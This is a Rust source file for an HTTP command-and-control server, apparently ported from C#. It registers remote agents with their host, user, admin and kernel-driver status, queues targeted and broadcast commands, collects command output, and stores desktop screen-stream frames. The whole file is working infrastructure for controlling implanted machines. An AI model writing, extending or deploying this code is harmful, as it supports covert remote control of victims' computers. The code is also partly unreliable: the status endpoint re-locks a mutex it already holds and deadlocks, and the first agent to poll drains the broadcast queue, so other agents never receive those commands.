// c2_server.rs — Rust port of C2Server.cs
// Custom HTTP-based Command & Control Server using hyper.
// Agents poll for commands and post results.

use std::collections::{HashMap, VecDeque};
use std::sync::{Arc, Mutex};

use chrono::{DateTime, Utc};
use serde::{Serialize, Deserialize};
use rand::Rng;
use log::info;

// ==================== Data Models ====================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Command {
    pub id: String,
    pub agent_id: Option<String>,  // None = broadcast
    pub command: String,
    pub args: Option<String>,
    pub issued: DateTime<Utc>,
    pub consumed: bool,
}

impl C2Command {
    pub fn new(command: &str, agent_id: Option<&str>, args: Option<&str>) -> Self {
        Self {
            id: uuid::Uuid::new_v4().to_string()[..8].to_string(),
            agent_id: agent_id.map(|s| s.to_string()),
            command: command.to_string(),
            args: args.map(|s| s.to_string()),
            issued: Utc::now(),
            consumed: false,
        }
    }

    pub fn serialize(&self) -> String {
        format!(
            "{}|{}|{}|{}|{}",
            self.id,
            self.agent_id.as_deref().unwrap_or("*"),
            self.command,
            self.args.as_deref().unwrap_or(""),
            self.issued.to_rfc3339()
        )
    }

    pub fn deserialize(line: &str) -> Option<Self> {
        let parts: Vec<&str> = line.splitn(5, '|').collect();
        if parts.len() < 5 {
            return None;
        }
        Some(Self {
            id: parts[0].to_string(),
            agent_id: if parts[1] == "*" { None } else { Some(parts[1].to_string()) },
            command: parts[2].to_string(),
            args: if parts[3].is_empty() { None } else { Some(parts[3].to_string()) },
            issued: chrono::DateTime::parse_from_rfc3339(parts[4])
                .map(|dt| dt.with_timezone(&Utc))
                .unwrap_or_else(|_| Utc::now()),
            consumed: false,
        })
    }
}

#[derive(Debug, Clone)]
pub struct C2Result {
    pub agent_id: String,
    pub command_id: String,
    pub success: bool,
    pub output: String,
    pub file_data: Option<Vec<u8>>,
    pub file_name: Option<String>,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentInfo {
    pub agent_id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip: String,
    pub is_admin: bool,
    pub kernel_driver_loaded: bool,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub ping_count: u32,
}

#[derive(Debug, Clone)]
pub struct AgentStatusEvent {
    pub agent_id: String,
    pub hostname: String,
    pub ip: String,
    pub is_online: bool,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone)]
pub struct StreamFrame {
    pub data: Vec<u8>,
    pub timestamp: DateTime<Utc>,
    pub agent_id: String,
}

// ==================== C2 Server ====================

pub struct C2Server {
    port: u16,
    auth_key: String,
    _file_drop_dir: String,
    agent_timeout_seconds: i64,

    agents: Arc<Mutex<HashMap<String, AgentInfo>>>,
    command_queues: Arc<Mutex<HashMap<String, VecDeque<C2Command>>>>,
    broadcast_queue: Arc<Mutex<VecDeque<C2Command>>>,
    results: Arc<Mutex<Vec<C2Result>>>,
    stream_frames: Arc<Mutex<HashMap<String, StreamFrame>>>,
    status_events: Arc<Mutex<VecDeque<AgentStatusEvent>>>,
    _previous_online_state: Arc<Mutex<HashMap<String, bool>>>,
    is_running: Arc<std::sync::atomic::AtomicBool>,
}

impl C2Server {
    pub fn new(
        port: u16,
        auth_key: Option<&str>,
        file_drop_dir: Option<&str>,
        agent_timeout_seconds: i64,
        _stale_cleanup_interval_ms: u64,
    ) -> Self {
        let key = auth_key
            .map(|s| s.to_string())
            .unwrap_or_else(generate_key);

        let drop_dir = file_drop_dir
            .map(|s| s.to_string())
            .unwrap_or_else(|| {
                let dir = std::path::Path::new(".").join("c2_drops");
                dir.to_string_lossy().to_string()
            });

        let _ = std::fs::create_dir_all(&drop_dir);

        Self {
            port,
            auth_key: key,
            _file_drop_dir: drop_dir,
            agent_timeout_seconds,
            agents: Arc::new(Mutex::new(HashMap::new())),
            command_queues: Arc::new(Mutex::new(HashMap::new())),
            broadcast_queue: Arc::new(Mutex::new(VecDeque::new())),
            results: Arc::new(Mutex::new(Vec::new())),
            stream_frames: Arc::new(Mutex::new(HashMap::new())),
            status_events: Arc::new(Mutex::new(VecDeque::new())),
            _previous_online_state: Arc::new(Mutex::new(HashMap::new())),
            is_running: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        }
    }

    pub fn auth_key(&self) -> &str {
        &self.auth_key
    }

    pub fn is_agent_connected(&self, agent_id: &str) -> bool {
        let agents = self.agents.lock().unwrap();
        if let Some(agent) = agents.get(agent_id) {
            let elapsed = (Utc::now() - agent.last_seen).num_seconds();
            elapsed < self.agent_timeout_seconds
        } else {
            false
        }
    }

    pub fn get_connected_agents(&self) -> Vec<AgentInfo> {
        let agents = self.agents.lock().unwrap();
        let cutoff = Utc::now() - chrono::Duration::seconds(self.agent_timeout_seconds);
        agents
            .values()
            .filter(|a| a.last_seen >= cutoff)
            .cloned()
            .collect()
    }

    pub fn get_disconnected_agents(&self) -> Vec<AgentInfo> {
        let agents = self.agents.lock().unwrap();
        let cutoff = Utc::now() - chrono::Duration::seconds(self.agent_timeout_seconds);
        agents
            .values()
            .filter(|a| a.last_seen < cutoff)
            .cloned()
            .collect()
    }

    pub fn get_connection_summary(&self) -> String {
        let connected = self.get_connected_agents();
        let disconnected = self.get_disconnected_agents();
        let agents = self.agents.lock().unwrap();

        let mut summary = format!(
            "Connected: {} | Disconnected: {} | Total: {}\n\n",
            connected.len(),
            disconnected.len(),
            agents.len()
        );

        let mut sorted: Vec<_> = agents.values().cloned().collect();
        sorted.sort_by(|a, b| b.last_seen.cmp(&a.last_seen));

        for a in &sorted {
            let online = self.is_agent_connected(&a.agent_id);
            let indicator = if online { "●" } else { "○" };
            let ago = (Utc::now() - a.last_seen).num_seconds();
            summary.push_str(&format!(
                "  {} {:<10} {:<16} last seen {}s ago\n",
                indicator, a.agent_id, a.hostname, ago
            ));
        }

        summary
    }

    /// Queue a command for a specific agent.
    pub fn queue_command(&self, agent_id: &str, command: &str, args: Option<&str>) -> String {
        let cmd = C2Command::new(command, Some(agent_id), args);
        let cmd_id = cmd.id.clone();

        let mut queues = self.command_queues.lock().unwrap();
        queues
            .entry(agent_id.to_string())
            .or_insert_with(VecDeque::new)
            .push_back(cmd.clone());

        info!("[CMD] {} -> {}: {} {}", cmd_id, agent_id, command, args.unwrap_or(""));
        cmd_id
    }

    /// Queue a command for ALL connected agents.
    pub fn broadcast_command(&self, command: &str, args: Option<&str>) -> String {
        let cmd = C2Command::new(command, None, args);
        let cmd_id = cmd.id.clone();

        self.broadcast_queue.lock().unwrap().push_back(cmd);
        info!("[BROADCAST] {}: {} {}", cmd_id, command, args.unwrap_or(""));
        cmd_id
    }

    /// Start the HTTP server — binds and routes requests to handlers
    pub fn start_http(&self) -> tokio::task::JoinHandle<()> {
        use hyper::server::conn::http1;
        use hyper::service::service_fn;
        use hyper::Request;
        use hyper::body::Incoming;
        use hyper_util::rt::TokioIo;

        self.is_running.store(true, std::sync::atomic::Ordering::Relaxed);
        let port = self.port;
        let auth_key = self.auth_key.clone();
        let server = self.clone_arc();

        info!("C2 Server listening on 0.0.0.0:{}", port);
        info!("Auth Key: {}", self.auth_key);

        tokio::spawn(async move {
            let addr = std::net::SocketAddr::from(([0, 0, 0, 0], port));
            let listener = match tokio::net::TcpListener::bind(addr).await {
                Ok(l) => l,
                Err(e) => {
                    eprintln!("[!] Failed to bind port {}: {}", port, e);
                    return;
                }
            };

            println!("[+] C2 HTTP Server running on 0.0.0.0:{}", port);

            loop {
                let (stream, client_addr) = match listener.accept().await {
                    Ok(s) => s,
                    Err(_) => continue,
                };

                let auth = auth_key.clone();
                let srv = server.clone();

                tokio::spawn(async move {
                    let service = service_fn(move |req: Request<Incoming>| {
                        let auth = auth.clone();
                        let srv = srv.clone();
                        let ip = client_addr.ip().to_string();
                        async move {
                            handle_request(req, &auth, &srv, &ip).await
                        }
                    });

                    let io = TokioIo::new(stream);
                    if let Err(e) = http1::Builder::new()
                        .serve_connection(io, service)
                        .await
                    {
                        eprintln!("Connection error: {}", e);
                    }
                });
            }
        })
    }

    /// Old start method (no-op, for backwards compat)
    pub fn start(&self) {
        self.is_running.store(true, std::sync::atomic::Ordering::Relaxed);
        info!("C2 Server initialized on port {} (call start_http for real HTTP)", self.port);
    }

    /// Create a thread-safe clone for sharing across async tasks
    fn clone_arc(&self) -> Arc<C2ServerInner> {
        Arc::new(C2ServerInner {
            agents: self.agents.clone(),
            command_queues: self.command_queues.clone(),
            broadcast_queue: self.broadcast_queue.clone(),
            results: self.results.clone(),
            stream_frames: self.stream_frames.clone(),
            status_events: self.status_events.clone(),
            auth_key: self.auth_key.clone(),
            port: self.port,
            agent_timeout: self.agent_timeout_seconds,
        })
    }

    pub fn stop(&self) {
        self.is_running.store(false, std::sync::atomic::Ordering::Relaxed);
        info!("C2 Server stopped");
    }

    /// Handle agent check-in
    pub fn handle_check_in(
        &self,
        agent_id: &str,
        hostname: &str,
        username: &str,
        os: &str,
        ip: &str,
        is_admin: bool,
        kernel_loaded: bool,
    ) -> String {
        let mut agents = self.agents.lock().unwrap();

        let agent = agents.entry(agent_id.to_string()).or_insert_with(|| AgentInfo {
            agent_id: agent_id.to_string(),
            hostname: hostname.to_string(),
            username: username.to_string(),
            os: os.to_string(),
            ip: ip.to_string(),
            is_admin,
            kernel_driver_loaded: kernel_loaded,
            first_seen: Utc::now(),
            last_seen: Utc::now(),
            ping_count: 0,
        });

        agent.last_seen = Utc::now();
        agent.ping_count += 1;
        agent.ip = ip.to_string();
        agent.kernel_driver_loaded = kernel_loaded;

        info!(
            "[CHECKIN] {} from {} ({}\\{})",
            agent_id, ip, hostname, username
        );

        format!("id={}", agent_id)
    }

    /// Handle poll request — return pending commands for the agent
    pub fn handle_poll(&self, agent_id: &str) -> String {
        // Update last seen
        if let Some(agent) = self.agents.lock().unwrap().get_mut(agent_id) {
            agent.last_seen = Utc::now();
            agent.ping_count += 1;
        }

        let mut commands = Vec::new();

        // Agent-specific commands
        if let Some(queue) = self.command_queues.lock().unwrap().get_mut(agent_id) {
            while let Some(cmd) = queue.pop_front() {
                commands.push(cmd.serialize());
            }
        }

        commands.join("\n")
    }

    /// Handle heartbeat
    pub fn handle_heartbeat(&self, agent_id: &str) {
        if let Some(agent) = self.agents.lock().unwrap().get_mut(agent_id) {
            agent.last_seen = Utc::now();
            agent.ping_count += 1;
        }
    }

    /// Store a command result
    pub fn store_result(&self, result: C2Result) {
        info!(
            "[RESULT] {}/{}: {}",
            result.agent_id,
            result.command_id,
            truncate(&result.output, 80)
        );
        self.results.lock().unwrap().push(result);
    }

    /// Get latest stream frame for an agent
    pub fn get_latest_frame(&self, agent_id: &str) -> Option<StreamFrame> {
        self.stream_frames.lock().unwrap().get(agent_id).cloned()
    }

    /// Store a desktop stream frame
    pub fn store_stream_frame(&self, agent_id: &str, data: Vec<u8>) {
        if let Some(agent) = self.agents.lock().unwrap().get_mut(agent_id) {
            agent.last_seen = Utc::now();
        }

        if !data.is_empty() {
            self.stream_frames.lock().unwrap().insert(
                agent_id.to_string(),
                StreamFrame {
                    agent_id: agent_id.to_string(),
                    data,
                    timestamp: Utc::now(),
                },
            );
        }
    }

    pub fn get_recent_status_events(&self, count: usize) -> Vec<AgentStatusEvent> {
        let events = self.status_events.lock().unwrap();
        events.iter().rev().take(count).cloned().collect()
    }
}

// ==================== Helpers ====================

fn generate_key() -> String {
    let mut rng = rand::thread_rng();
    let bytes: Vec<u8> = (0..24).map(|_| rng.gen()).collect();
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(&bytes)
        .replace('+', "x")
        .replace('/', "y")
        .chars()
        .take(32)
        .collect()
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() > max {
        format!("{}...", &s[..max])
    } else {
        s.to_string()
    }
}

// ==================== Shared Server State for Async ====================

#[derive(Clone)]
pub struct C2ServerInner {
    pub agents: Arc<Mutex<HashMap<String, AgentInfo>>>,
    pub command_queues: Arc<Mutex<HashMap<String, VecDeque<C2Command>>>>,
    pub broadcast_queue: Arc<Mutex<VecDeque<C2Command>>>,
    pub results: Arc<Mutex<Vec<C2Result>>>,
    pub stream_frames: Arc<Mutex<HashMap<String, StreamFrame>>>,
    pub status_events: Arc<Mutex<VecDeque<AgentStatusEvent>>>,
    pub auth_key: String,
    pub port: u16,
    pub agent_timeout: i64,
}

impl C2ServerInner {
    fn is_agent_connected(&self, agent_id: &str) -> bool {
        let agents = self.agents.lock().unwrap();
        if let Some(agent) = agents.get(agent_id) {
            (Utc::now() - agent.last_seen).num_seconds() < self.agent_timeout
        } else {
            false
        }
    }
}

// ==================== HTTP Request Handler ====================

async fn handle_request(
    req: hyper::Request<hyper::body::Incoming>,
    auth_key: &str,
    server: &Arc<C2ServerInner>,
    client_ip: &str,
) -> Result<hyper::Response<http_body_util::Full<bytes::Bytes>>, std::convert::Infallible> {
    use hyper::StatusCode;
    use http_body_util::Full;
    use bytes::Bytes;
    use http_body_util::BodyExt;

    let path = req.uri().path().to_string();
    let query = req.uri().query().unwrap_or("").to_string();
    let _method = req.method().clone();

    // Parse query params
    let params: HashMap<String, String> = query
        .split('&')
        .filter_map(|p| {
            let mut parts = p.splitn(2, '=');
            Some((parts.next()?.to_string(), parts.next().unwrap_or("").to_string()))
        })
        .collect();

    // Check auth (skip for heartbeat)
    if path != "/heartbeat" {
        // Accept auth from either X-Auth header or ?key= query param
        let provided_key = req.headers()
            .get("X-Auth")
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string())
            .or_else(|| params.get("key").cloned());

        match provided_key {
            Some(key) if key == auth_key => { /* authenticated */ }
            Some(_) => {
                return Ok(hyper::Response::builder()
                    .status(StatusCode::FORBIDDEN)
                    .body(Full::new(Bytes::from("Invalid auth key")))
                    .unwrap());
            }
            None => {
                return Ok(hyper::Response::builder()
                    .status(StatusCode::FORBIDDEN)
                    .body(Full::new(Bytes::from("Missing auth key")))
                    .unwrap());
            }
        }
    }

    let response_body = match path.as_str() {
        "/checkin" => {
            let id = params.get("id").cloned().unwrap_or_default();
            let host = params.get("host").cloned().unwrap_or_default();
            let user = params.get("user").cloned().unwrap_or_default();
            let os = params.get("os").cloned().unwrap_or_default();
            let admin = params.get("admin").and_then(|v| v.parse().ok()).unwrap_or(false);
            let kernel = params.get("kernel").and_then(|v| v.parse().ok()).unwrap_or(false);

            // Register/update agent
            let mut agents = server.agents.lock().unwrap();
            let agent = agents.entry(id.clone()).or_insert_with(|| AgentInfo {
                agent_id: id.clone(),
                hostname: host.clone(),
                username: user.clone(),
                os: os.clone(),
                ip: client_ip.to_string(),
                is_admin: admin,
                kernel_driver_loaded: kernel,
                first_seen: Utc::now(),
                last_seen: Utc::now(),
                ping_count: 0,
            });
            agent.last_seen = Utc::now();
            agent.ping_count += 1;
            agent.ip = client_ip.to_string();

            println!("  [CHECKIN] {} from {} ({}\\{})", id, client_ip, host, user);
            format!("OK id={}", id)
        }

        "/poll" => {
            let id = params.get("id").cloned().unwrap_or_default();

            // Update last seen
            if let Some(agent) = server.agents.lock().unwrap().get_mut(&id) {
                agent.last_seen = Utc::now();
                agent.ping_count += 1;
            }

            // Collect commands for this agent
            let mut commands = Vec::new();
            if let Some(queue) = server.command_queues.lock().unwrap().get_mut(&id) {
                while let Some(cmd) = queue.pop_front() {
                    commands.push(cmd.serialize());
                }
            }

            // Also check broadcast queue
            let mut bc = server.broadcast_queue.lock().unwrap();
            for cmd in bc.drain(..) {
                commands.push(cmd.serialize());
            }

            commands.join("\n")
        }

        "/heartbeat" => {
            let id = params.get("id").cloned().unwrap_or_default();
            if let Some(agent) = server.agents.lock().unwrap().get_mut(&id) {
                agent.last_seen = Utc::now();
                agent.ping_count += 1;
            }
            "OK".to_string()
        }

        "/result" => {
            // Read body
            let body_bytes = match req.collect().await {
                Ok(b) => b.to_bytes(),
                Err(_) => Bytes::new(),
            };
            let body_str = String::from_utf8_lossy(&body_bytes).to_string();

            let id = params.get("id").cloned().unwrap_or_default();
            let cmd_id = params.get("cmd_id").cloned().unwrap_or_default();
            let success = params.get("success").map(|v| v == "1").unwrap_or(false);

            server.results.lock().unwrap().push(C2Result {
                agent_id: id.clone(),
                command_id: cmd_id.clone(),
                success,
                output: body_str.clone(),
                file_data: None,
                file_name: None,
                timestamp: Utc::now(),
            });

            println!("  [RESULT] {}/{}: {}", id, cmd_id, truncate(&body_str, 80));
            "OK".to_string()
        }

        "/status" => {
            let connected: Vec<_> = server.agents.lock().unwrap().values()
                .filter(|a| server.is_agent_connected(&a.agent_id))
                .cloned()
                .collect();
            serde_json::to_string(&connected).unwrap_or_else(|_| "[]".to_string())
        }

        _ => {
            return Ok(hyper::Response::builder()
                .status(StatusCode::NOT_FOUND)
                .body(Full::new(Bytes::from("Not found")))
                .unwrap());
        }
    };

    Ok(hyper::Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "text/plain")
        .body(Full::new(Bytes::from(response_body)))
        .unwrap())
}

